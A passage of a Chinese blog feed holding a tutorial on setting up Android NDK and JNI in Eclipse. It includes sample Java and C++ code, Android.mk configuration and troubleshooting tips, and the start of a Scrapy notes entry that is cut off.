<code>Windows</code>-&gt;<code>Preferences</code>-&gt;<code>Android</code>，配置SDK路径，在<code>Android</code>的<code>NDK</code>标签下配置NDK路径。</li></ol><h2 id="三、JNI开发示例"><a href="#三、JNI开发示例" class="headerlink" title="三、JNI开发示例"></a>三、JNI开发示例</h2><p>开发环境：Windows 7 SP1 x64，Eclipse LUNA，JDK 1.7，CDT 8.5.0，ADT 23.0.4</p><h3 id="1-新建Android项目"><a href="#1-新建Android项目" class="headerlink" title="1) 新建Android项目"></a>1) 新建Android项目</h3><ol><li><p>Eclipse新建Android项目，这里命名为<code>jnitest</code>。<img src="https://cdn.jsdelivr.net/gh/gymgle/imgur/2015-01-17_213510.webp" alt="New Android Application" title="New Android Application"></p></li><li><p>我们使用<code>TextView</code>显示JNI的调用结果，修改<code>res</code>-&gt;<code>layout</code>目录下的<code>activity_main.xml</code>，给默认的<code>TextView</code>添加一个id：<code>tvTest</code>，方便以后在<code>MainActivity</code>中调用。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">TextView</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:id</span>=<span class="string">"@+id/tvTest"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:text</span>=<span class="string">"@string/hello_world"</span> /&gt;</span></span><br></pre></td></tr></table></figure></li></ol><h3 id="2-添加Native支持"><a href="#2-添加Native支持" class="headerlink" title="2) 添加Native支持"></a>2) 添加Native支持</h3><p><code>jnitest</code>项目右键<code>Android Tool</code>-&gt;<code>Add Native Support...</code>，这里为动态库命名为<code>doit</code>，然后在Android工程目录中会生成一个<code>jni</code>目录，并生成<code>Android.mk</code>和<code>doit.cpp</code>文件。<br><img src="https://cdn.jsdelivr.net/gh/gymgle/imgur/2015-01-17_224538.webp" alt="Add Android Native Support" title="Add Android Native Support"></p><p><code>Android.mk</code>文件的功能类似GNU Makefile，详细了解请参考<a href="http://blog.csdn.net/zhandoushi1982/article/details/5316669" target="_blank" rel="noopener">《Android.mk的用法和基础》</a>。打开<code>Android.mk</code>，从下面两行代码可以看出，我们要编译的模块名字是<code>doit</code>，编译使用的源文件是<code>doit.cpp</code>：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LOCAL_MODULE    := doit</span><br><span class="line">LOCAL_SRC_FILES := doit.cpp</span><br></pre></td></tr></table></figure><p>如果添加了更多的<code>.cpp</code>源文件，需要在<code>Android.mk</code>中<code>LOCAL_SRC_FILES</code>后添加对应的源文件。</p><p>另外需要注意的地方，就是动态库的名字。在给动态库命名时我们只写了<code>doit</code>，Eclipse默认给添加了<code>lib</code>和<code>.so</code>，也就是说动态库的名字应该是<code>libdoit.so</code>。这是因为linux的动态库命名必须以<code>lib</code>开头，即<code>libXXX.so</code>。<code>XXX</code>是动态库的名字，我们在Java代码中加载动态库的时候指定名字是<code>XXX</code>而不是<code>libXXX</code>。</p><p>当我们编写完C/C++代码并编译链接后，会在项目的<code>libs\armeabi</code>目录下生成<code>libdoit.so</code>。</p><h3 id="3-添加JNI类"><a href="#3-添加JNI类" class="headerlink" title="3) 添加JNI类"></a>3) 添加JNI类</h3><p>为Android项目添加一个Java类，这里命名为<code>JNITest</code>：<img src="https://cdn.jsdelivr.net/gh/gymgle/imgur/2015-01-17_230000.webp" alt="New Java Class" title="New Java Class"></p><p><code>JNITest</code>类指定我们要加载的<code>libdoit.so</code>动态库并声明Native方法。这个Native方法就是我们接下来要使用C/C++实现的方法。</p><p>JNITest类的实现如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.jnitest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JNITest</span> </span>&#123;</span><br><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">System.loadLibrary(<span class="string">"doit"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">native</span> String <span class="title">DoIt</span><span class="params">(String s)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第5行使用<code>System.loadLibrary(&quot;doit&quot;);</code>指定加载<code>libdoit.so</code>，第8行声明了<code>DoIt()</code>的Native方法，参数和返回值都是字符串类型。</p><p>如果只是简单地演示，完全可以在<code>MainActivity.java</code>里加载动态库和声明Native方法。这里编写了一个<code>JNITest</code>类，是为了更好地扩展，以便在其他项目里也能使用这个类来调用生成的动态库。</p><h3 id="4-实现C-C-方法"><a href="#4-实现C-C-方法" class="headerlink" title="4) 实现C/C++方法"></a>4) 实现C/C++方法</h3><p>打开<code>jni</code>下的<code>doit.cpp</code>，添加如下代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="string">"C"</span> &#123;</span><br><span class="line">    <span class="function">JNIEXPORT jstring <span class="title">Java_com_example_jnitest_JNITest_DoIt</span><span class="params">(JNIEnv* env, jobject obj, jstring s)</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">JNIEXPORT jstring <span class="title">Java_com_example_jnitest_JNITest_DoIt</span><span class="params">(JNIEnv* env, jobject obj, jstring s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 具体实现</span></span><br><span class="line">    <span class="keyword">return</span> env-&gt;NewStringUTF(<span class="string">"Good Job!"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数说明：</p><ul><li>返回值：<code>jstring</code>是函数的返回值类型，如果没有返回值，写<code>void</code>，如果返回值是<code>int</code>型，写<code>jint</code>，即在C/C++类型前加<code>j</code>。</li><li>函数名<code>Java_com_example_jnitest_JNITest_DoIt</code>：函数名要以<code>_</code>连接，<code>Java</code>是必需的，<code>com_example_jnitest</code>是<code>JNITest</code>类的包名，也就是我们创建Android项目时命名的包名，<code>JNITest</code>是声明Native方法的类名，<code>DoIt</code>是Native方法名。</li><li>函数的参数：<code>JNIEnv* env</code>和<code>jobject obj</code>是实现Native方法必需的两个参数，我们在<code>JNITest</code>类中声明的Native方法只有一个<code>String</code>类型的参数，在这里要添加到这两个参数后面，使用<code>jstring</code>类型。</li><li>因此，C/C++实现JNI方法时函数的命名规则是：<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JNIEXPORT 返回值类型 Java_包名_类名_方法名(JNIEnv* env, jobject obj, 自定义参数...);</span><br></pre></td></tr></table></figure></li></ul><h3 id="5-新建C-C-Builder"><a href="#5-新建C-C-Builder" class="headerlink" title="5) 新建C/C++ Builder"></a>5) 新建C/C++ Builder</h3><p>为了更方便地编译C/C++，我们新建一个Builder：</p><ol><li><code>jnitest</code>项目右键<code>Properties</code>-&gt;<code>Builders</code>-&gt;<code>New</code>，选择<code>Program</code>，点击<code>OK</code>，我们把它命名为<code>NDK_Builder</code>。</li><li>Main选项卡：<br>在<code>Location:</code>中点击<code>Browse File System...</code>选择Android NDK目录下的<code>ndk-build.cmd</code>；在<code>Working Directory:</code>中输入<code>${workspace_loc}\jnitest</code>，或者通过<code>Browse File System...</code>选择项目所在目录。<br><img src="https://cdn.jsdelivr.net/gh/gymgle/imgur/2015-01-17_233948.webp" alt="Builder Main Option" title="Builder Main Option"></li><li>Build Options选项卡：<br>默认勾选了<code>Allocate Console (necessary for input)</code>、<code>After a &quot;Clean&quot;</code>、<code>During manual builds</code>；勾选<code>During auto builds</code>和<code>During a &quot;Clean&quot;</code>；也可以勾选<code>Specify working set of relevant resources</code>并点击<code>Specify Resources…</code>指定项目。<br><img src="https://cdn.jsdelivr.net/gh/gymgle/imgur/2015-01-17_234157.webp" alt="Builder Optoins" title="Builder Option"></li><li>点击<code>OK</code>完成配置。</li></ol><p>这样，以后每次点击<code>Project</code>-&gt;<code>clean...</code>就直接编译链接C/C++了，在项目的<code>libs\armeabi</code>下会自动生成<code>libdoit.so</code>动态库。</p><h3 id="6-Android代码实现"><a href="#6-Android代码实现" class="headerlink" title="6) Android代码实现"></a>6) Android代码实现</h3><p>接下来我们在Android的<code>MainActivity.java</code>中实例化<code>JNITest</code>类并把<code>DoIt()</code>方法返回的字符串显示到Android的<code>TextView</code>中：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// MainActivity.java</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.example.jnitest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.support.v7.app.ActionBarActivity;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.view.Menu;</span><br><span class="line"><span class="keyword">import</span> android.view.MenuItem;</span><br><span class="line"><span class="keyword">import</span> android.widget.TextView;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">ActionBarActivity</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> TextView tv;                 <span class="comment">// TextView</span></span><br><span class="line"><span class="keyword">private</span> String s = <span class="string">"Just Do It"</span>;     <span class="comment">// DoIt()的参数</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line"><span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">setContentView(R.layout.activity_main);</span><br><span class="line">tv = (TextView) findViewById(R.id.tvTest);</span><br><span class="line"></span><br><span class="line">JNITest jnitest = <span class="keyword">new</span> JNITest(); <span class="comment">// 实例化JNITest类</span></span><br><span class="line">tv.setText(jnitest.DoIt(s));     <span class="comment">// 调用Native方法</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 其他代码</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>jnitest</code>项目右键<code>Run As</code>-&gt;<code>Android Application</code>，使用模拟器或者手机来测试一下吧。<br><img src="https://cdn.jsdelivr.net/gh/gymgle/imgur/2015-01-18_001951.webp" alt="模拟器运行结果" title="模拟器运行结果"></p><h3 id="7-更复杂一点"><a href="#7-更复杂一点" class="headerlink" title="7) 更复杂一点"></a>7) 更复杂一点</h3><p>上面的JNI小程序已经结束了。但在实际开发中可不会实现这么简单的功能，复杂的功能可能需要添加多个C/C++源文件和头文件。这里，我们演示JNI中添加<code>.cpp</code>和<code>.h</code>，在Android的SDCard上创建文件。</p><p>1.项目右键<code>New</code>-&gt;<code>Header File</code>，新建C/C++头文件<code>other.h</code>，在头文件中声明函数：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">createfile</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *filename)</span></span>;</span><br></pre></td></tr></table></figure><p>2.项目右键<code>New</code>-&gt;<code>Source File</code>，新建C++源文件<code>other.cpp</code>，编写代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"other.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">createfile</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *filename)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">FILE *file;</span><br><span class="line"><span class="keyword">if</span> ((file = fopen(filename, <span class="string">"wb"</span>)) == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">fclose(file);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3.在<code>doit.cpp</code>中引用<code>other.h</code>，调用<code>createfile()</code>：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;jni.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"other.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">"C"</span> &#123;</span><br><span class="line">    <span class="function">JNIEXPORT jstring <span class="title">Java_com_example_jnitest_JNITest_DoIt</span><span class="params">(JNIEnv* env, jobject obj, jstring s)</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">JNIEXPORT jstring <span class="title">Java_com_example_jnitest_JNITest_DoIt</span><span class="params">(JNIEnv* env, jobject obj, jstring s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 把jstring转换为char *</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *filename = env-&gt;GetStringUTFChars(s, <span class="number">0</span>);</span><br><span class="line">    createfile(filename);</span><br><span class="line">    <span class="keyword">return</span> env-&gt;NewStringUTF(<span class="string">"Good Job!"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>4.非常重要的一步：在<code>Android.mk</code>中添加<code>other.cpp</code>，否则编译链接的时候会出现<code>error: undefined reference to xxx</code>的错误：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">LOCAL_PATH := $(call my-dir)</span><br><span class="line"></span><br><span class="line">include $(CLEAR_VARS)</span><br><span class="line"></span><br><span class="line">LOCAL_MODULE    := doit</span><br><span class="line">LOCAL_SRC_FILES := doit.cpp \</span><br><span class="line">                   other.cpp</span><br><span class="line"></span><br><span class="line">include $(BUILD_SHARED_LIBRARY)</span><br></pre></td></tr></table></figure><p>5.<code>Project</code>-&gt;<code>Clean...</code>编译链接生成动态库。</p><p>6.这里涉及到操作Android SDCard，需要在项目的<code>AndroidManifest.xml</code>中添加相应权限：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.WRITE_EXTERNAL_STORAGE"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.MOUNT_UNMOUNT_FILESYSTEMS"</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>另外，修改<code>MainActivity.java</code>，给Native方法<code>DoIt(String s)</code>传递参数指定创建文件的名字：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">ActionBarActivity</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> TextView tv;</span><br><span class="line"><span class="keyword">private</span> String s = <span class="string">"/sdcard/JustDoIt.txt"</span>;</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line"><span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">setContentView(R.layout.activity_main);</span><br><span class="line">tv = (TextView) findViewById(R.id.tvTest);</span><br><span class="line"></span><br><span class="line">JNITest jnitest = <span class="keyword">new</span> JNITest();</span><br><span class="line">tv.setText(jnitest.DoIt(s));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>项目右键<code>Run As</code>-&gt;<code>Android Application</code>，启动模拟器或连接手机，查看SD卡上是否成功创建了文件。<br><img src="https://cdn.jsdelivr.net/gh/gymgle/imgur/2015-01-18_115549.webp" alt="模拟器运行结果" title="模拟器运行结果"></p><h3 id="8-示例程序下载"><a href="#8-示例程序下载" class="headerlink" title="8) 示例程序下载"></a>8) 示例程序下载</h3><p>百度网盘: <a href="http://pan.baidu.com/s/1dD2DNhR" target="_blank" rel="noopener">http://pan.baidu.com/s/1dD2DNhR</a> 密码: zgvz</p><h2 id="三、JNI技巧"><a href="#三、JNI技巧" class="headerlink" title="三、JNI技巧"></a>三、JNI技巧</h2><h3 id="技巧1-JNI实现函数中LOG打印"><a href="#技巧1-JNI实现函数中LOG打印" class="headerlink" title="技巧1. JNI实现函数中LOG打印"></a>技巧1. JNI实现函数中LOG打印</h3><p>在Java环境下使用JNI时可以方便的使用printf函数打印信息，在Eclipse控制台Console视图可以方便的观察到，可在Android环境下使用JNI的话，printf函数就无效了，LogCat视图和Console视图里看不到任何输出。但我们可以使用Android本身的log方法，其实现步骤如下：</p><p>1.在JNI的实现代码文件（.c或者.cpp）中加入包含LOG头文件的如下代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;android/log.h&gt;</span></span></span><br></pre></td></tr></table></figure><p>2.在需要打印的方法中添加打印代码，例如：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__android_log_print(ANDROID_LOG_INFO, <span class="string">"jnitag"</span>, <span class="string">"Content"</span>);</span><br></pre></td></tr></table></figure><p><code>ANDROID_LOG_INFO</code>是日志级别；<br><code>jnitag</code>是要过滤的标签，可以在LogCat视图中过滤；<br><code>Content</code>是实际的日志内容。</p><p>3.在Android工程的Android.mk文件中添加如下内容：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LOCAL_LDLIBS += -L$(SYSROOT)/usr/lib -llog</span><br></pre></td></tr></table></figure><p>4.OK，现在就可以打印信息了。</p><h3 id="技巧2-Converting-jstring-to-char"><a href="#技巧2-Converting-jstring-to-char" class="headerlink" title="技巧2. Converting jstring to char *"></a>技巧2. Converting jstring to char *</h3><p>以下是C语言实现：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">JNIEXPORT <span class="keyword">void</span> JNICALL <span class="title">Java_ClassName_MethodName</span><span class="params">(JNIEnv *env, jobject obj, jstring javaString)</span>  </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">const</span> <span class="keyword">char</span> *nativeString = (*env)-&gt;GetStringUTFChars(env, javaString, <span class="number">0</span>);</span><br><span class="line"> </span><br><span class="line">   <span class="comment">// use your string</span></span><br><span class="line"> </span><br><span class="line">   (*env)-&gt;ReleaseStringUTFChars(env, javaString, nativeString);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果使用C++，应该这样（env不加<code>*</code>，<code>GetStringUTFChars()</code>等方法少一个参数<code>env</code>）：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">JNIEXPORT <span class="keyword">void</span> JNICALL <span class="title">Java_ClassName_MethodName</span><span class="params">(JNIEnv *env, jobject obj, jstring javaString)</span>  </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">const</span> <span class="keyword">char</span> *nativeString = env-&gt;GetStringUTFChars(javaString, <span class="number">0</span>);</span><br><span class="line"> </span><br><span class="line">   <span class="comment">// use your string</span></span><br><span class="line"> </span><br><span class="line">   env-&gt;ReleaseStringUTFChars(javaString, nativeString);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="四、JNI问题"><a href="#四、JNI问题" class="headerlink" title="四、JNI问题"></a>四、JNI问题</h2><h3 id="问题1-导入Android工程时提示“XXX-overlaps-the-location-of-another-project-‘XXX’”"><a href="#问题1-导入Android工程时提示“XXX-overlaps-the-location-of-another-project-‘XXX’”" class="headerlink" title="问题1. 导入Android工程时提示“XXX overlaps the location of another project: ‘XXX’”"></a>问题1. 导入Android工程时提示“XXX overlaps the location of another project: ‘XXX’”</h3><p>导入时不要选择导入android工程，而是General工程。</p><h3 id="问题2-删除Eclipse的-metadata文件夹NDK工程提示Program-quot-sh-quot-not-found-in-PATH"><a href="#问题2-删除Eclipse的-metadata文件夹NDK工程提示Program-quot-sh-quot-not-found-in-PATH" class="headerlink" title="问题2. 删除Eclipse的.metadata文件夹NDK工程提示Program &quot;sh&quot; not found in PATH"></a>问题2. 删除Eclipse的<code>.metadata</code>文件夹NDK工程提示<code>Program &quot;sh&quot; not found in PATH</code></h3><p>重新设置一下Eclipse：<code>Windows</code>-&gt;<code>Preferences</code>-&gt;<code>Android</code>-&gt;<code>NDK</code>，然后重启Eclipse。</p><h3 id="问题3-更新eclipse或者删除eclipse的-metadata文件夹导致找不到jni-h等头文件"><a href="#问题3-更新eclipse或者删除eclipse的-metadata文件夹导致找不到jni-h等头文件" class="headerlink" title="问题3. 更新eclipse或者删除eclipse的.metadata文件夹导致找不到jni.h等头文件"></a>问题3. 更新eclipse或者删除eclipse的<code>.metadata</code>文件夹导致找不到<code>jni.h</code>等头文件</h3><p>参考：<a href="http://stackoverflow.com/questions/23122934/eclipse-adt-unresolved-inclusion-jni-h" target="_blank" rel="noopener">http://stackoverflow.com/questions/23122934/eclipse-adt-unresolved-inclusion-jni-h</a></p><p><strong>Removing the C nature:</strong></p><p>1.Close the Eclipse project (e.g. by quitting Eclipse).</p><p>2.Open the <code>.project</code> file in a text or xml editor. There will be at least 2 <code>&lt;buildCommand&gt;</code> nodes that need to be removed. Remove the <code>&lt;buildCommand&gt;</code> node with name<code>org.eclipse.cdt.managedbuilder.core.genmakebuilder</code> and all its children, and the <code>&lt;buildCommand&gt;</code> node with name <code>org.eclipse.cdt.managedbuilder.core.ScannerConfigBuilder</code> and its children. Finally, remove the lines:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">nature</span>&gt;</span>org.eclipse.cdt.core.cnature<span class="tag">&lt;/<span class="name">nature</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">nature</span>&gt;</span>org.eclipse.cdt.core.ccnature<span class="tag">&lt;/<span class="name">nature</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">nature</span>&gt;</span>org.eclipse.cdt.managedbuilder.core.managedBuildNature<span class="tag">&lt;/<span class="name">nature</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">nature</span>&gt;</span>org.eclipse.cdt.managedbuilder.core.ScannerConfigNature<span class="tag">&lt;/<span class="name">nature</span>&gt;</span></span><br></pre></td></tr></table></figure><p>3.Completely remove the <code>.cproject</code> file.</p><p><strong>Adding back the Android Native nature</strong></p><p>Reopen the project in Eclipse. Then right-click on the project in the Project Explorer, and from the “Android Tools” contextual menu, choose “Add Native Support…”.</p><h3 id="问题4-Type-‘jint’-could-not-be-resolved-and-JNIEnv-jclass"><a href="#问题4-Type-‘jint’-could-not-be-resolved-and-JNIEnv-jclass" class="headerlink" title="问题4. Type ‘jint’ could not be resolved, and JNIEnv, jclass"></a>问题4. Type ‘jint’ could not be resolved, and JNIEnv, jclass</h3><p>参考：<a href="http://stackoverflow.com/questions/11666711/type-jint-could-not-be-resolved-and-jnienv-jclass" target="_blank" rel="noopener">http://stackoverflow.com/questions/11666711/type-jint-could-not-be-resolved-and-jnienv-jclass</a></p><p>其实还是找不到<code>jni.h</code>，删除项目<code>.project</code>文件中的<code>&lt;nature&gt;org.eclipse.cdt.core.ccnature&lt;/nature&gt;</code>，重启Eclipse。</p><h2 id="五、参考文章"><a href="#五、参考文章" class="headerlink" title="五、参考文章"></a>五、参考文章</h2><p><a href="http://www.cnblogs.com/mandroid/archive/2011/06/15/2081093.html" target="_blank" rel="noopener">http://www.cnblogs.com/mandroid/archive/2011/06/15/2081093.html</a><br><a href="http://blog.csdn.net/zhandoushi1982/article/details/5316669" target="_blank" rel="noopener">http://blog.csdn.net/zhandoushi1982/article/details/5316669</a><br><a href="http://blog.csdn.net/zhangjg_blog/article/details/15505781" target="_blank" rel="noopener">http://blog.csdn.net/zhangjg_blog/article/details/15505781</a><br><a href="http://weizhilizhiwei.iteye.com/blog/2157773" target="_blank" rel="noopener">http://weizhilizhiwei.iteye.com/blog/2157773</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;在Android开发中需要实现一个加解密功能，为了增加被逆向的难度，决定使用JNI实现该功能。使用C/C++编写代码，编译链接成&lt;code&gt;.so&lt;/code&gt;动态库，提供给Java调用。本文简单总结了Eclipse中Android NDK环境的搭建过程，编写了一个JNI的
      
    
    </summary>
    
    
      <category term="Android" scheme="https://g2ex.top/tags/Android/"/>
    
      <category term="NDK" scheme="https://g2ex.top/tags/NDK/"/>
    
      <category term="JNI" scheme="https://g2ex.top/tags/JNI/"/>
    
  </entry>
  
  <entry>
    <title>Scrapy笔记</title>
    <link href="https://g2ex.top/2014/12/26/Scrapy-Notes/"/>
    <id>https://g2ex.top/2014/12/26/Scrapy-Notes/</id>
    <published>2014-12-26T00:00:00.000Z</published>
    <updated>2020-11-25T02:09:19.684Z</updated>
    
    <content type="html"><![CDATA[<p>以下是最近写爬虫使用Scrapy的一些笔记。</p><h2 id="关于Scrapy"><a href="#关于Scrapy" class="headerlink" title="关于Scrapy"></a>关于Scrapy</h2><p>Scrapy官网：<a href="http://scrapy.org/" target="_blank" rel="noopener">http://scrapy.org/</a></p><p>Scrapy中文文档：<a href="http://scrapy-chs.readthedocs.org/zh_CN/latest/" target="_blank" rel="noopener">http://scrapy-chs.readthedocs.org/zh_CN/latest/</a></p><h2 id="urllib和urllib2调试设置"><a href="#urllib和urllib2调试设置" class="headerlink" title="urllib和urllib2调试设置"></a>urllib和urllib2调试设置</h2><p>要想看到urllib的调试状态，需要设置httplib的debuglevel：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib, httplib</span><br><span class="line">httplib.HTTPConnection.debuglevel = <span class="number">1</span></span><br><span class="line">response = urllib.urlopen(<span class="string">"http://wap.shouji.com.cn/wap/wdown/softversion?id=43432"</span>)</span><br></pre></td></tr></table></figure><p>可以看到这样的输出：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">send: 